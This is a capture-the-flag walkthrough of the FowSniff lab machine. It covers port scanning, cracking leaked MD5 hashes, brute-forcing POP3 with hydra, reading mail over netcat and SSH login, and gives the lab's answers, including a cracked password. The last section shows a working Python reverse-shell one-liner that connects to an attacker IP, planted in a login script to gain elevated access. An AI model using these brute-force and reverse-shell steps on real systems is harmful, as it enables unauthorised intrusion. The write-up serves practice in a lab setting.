# FowSniff

## 1. Using nmap, scan this machine. What ports are open?
Run `nmap -sCV -p- $ip` this can take very long however so I used rustscan instead by using `rustscan -a $ip`

## 2. Using the information from the open ports. Look around. What can you find?
4 Ports are open some interesting one are ssh, http and pop3
 
## 3. Using Google, can you find any public information about them?
We visit their website and found that they experienced
a data breach. Googling fowsniff corp gave us some email
and password hashes

## 4. Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.
Use website like hashkiller to decode them. The password
used by the employee are quite weak

## 5. Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
Use `hydra -L <Userlist> -P <PassList> -f $ip pop3. we see that the user seina reused password for her pop3 acc.

## 6.What was seina's password to the email service?
scoobydoo2

## 7. Looking through her emails, what was a temporary password set for her?
run `nc $ip 110` to access the pop3 server.
Run `USER seina` and `PASS scoobydoo2`. Run
RETR 1 and we can see the temporary password
There is another mail from baksteen 

## 8. In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
View mail 2 and ssh using that user name. He has the default password

## 9. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
When we login, we are greeted with a cube and the company logo. Run sudo -l and baksteen do not have any sudo rights. Upload linpeas.sh using python webserver `python -m http.server`
then in target machine do `wget $ip:8000/linpeas.sh` Do chmod +x linpeas.sh to set executable and run it. Linpeas highlighted cube.sh file which has elevated rights. We see that the cube is displayed when we login so this means that if we include our reverse shell code and relogin, we will get elevated shell.
Reverse shell `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.11.158",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
